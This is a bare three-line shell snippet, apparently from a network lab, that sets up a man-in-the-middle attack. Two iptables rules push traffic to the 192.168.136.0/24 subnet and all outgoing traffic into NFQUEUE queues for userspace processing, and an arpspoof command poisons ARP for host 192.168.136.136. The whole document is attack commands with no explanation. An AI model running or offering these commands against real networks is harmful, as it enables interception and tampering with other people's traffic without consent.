sudo iptables -t mangle -A PREROUTING -d 192.168.136.0/24 -j NFQUEUE --queue-num 1
sudo iptables -t mangle -A POSTROUTING -j NFQUEUE --queue-num 2

arpspoof -i ens33 192.168.136.136
